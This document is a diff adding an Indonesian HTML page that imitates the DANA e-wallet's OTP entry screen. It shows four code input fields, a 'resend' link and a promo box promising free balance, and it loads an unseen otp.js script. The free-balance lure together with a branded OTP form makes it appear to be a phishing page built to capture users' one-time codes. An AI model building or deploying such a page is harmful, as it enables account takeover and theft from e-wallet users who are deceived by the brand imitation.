@@ -1,0 +1,43 @@
+<!DOCTYPE html!>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Masukkan Kode OTP</title>
+    <link rel="stylesheet" href="otp.css">
+</head>
+<body>
+   <div class="container">
+    <div class="content">
+        <!-- Tambahkan tulisan "DANA" di atas "Masukkan Kode OTP" -->
+        <div class="brand-title">DANA</div>
+
+        <h2>Masukkan Kode OTP</h2>
+
+        <div class="otp-container">
+            <div class="otp-inputs">
+                <input id="otp1" maxlength="1" class="otp-input" type="text" inputmode="numeric"/>
+                <input id="otp2" maxlength="1" class="otp-input" type="text" inputmode="numeric"/>
+                <input id="otp3" maxlength="1" class="otp-input" type="text" inputmode="numeric"/>
+                <input id="otp4" maxlength="1" class="otp-input" type="text" inputmode="numeric"/>
+            </div>
+        </div>
+
+        <div class="pin-bottom-text">
+            <a href="#" class="resend-code" onclick="resendOTP()">Kirimkan Ulang</a>
+        </div>
+       <span class="promo-box">
+    DANA sering kali mengadakan promo atau event khusus yang memberikan saldo gratis kepada penggunanya. Promo ini biasanya berlangsung dalam periode waktu tertentu dan bisa diikuti oleh semua pengguna DANA.
+</span>
+
+</div>
+        <!-- Pesan Mengambang di Tengah Halaman -->
+        <div class="floating-message" style="display:none;">
+            <p>Silahkan buka aplikasi DANA lalu verifikasi notifikasi untuk mendapatkan kode OTP</p>
+            <p id="countdown">Tutup dalam 10 detik</p>
+        </div>
+    </div>
+</div>
+    <script src="otp.js"></script>
+</body>
+</html>
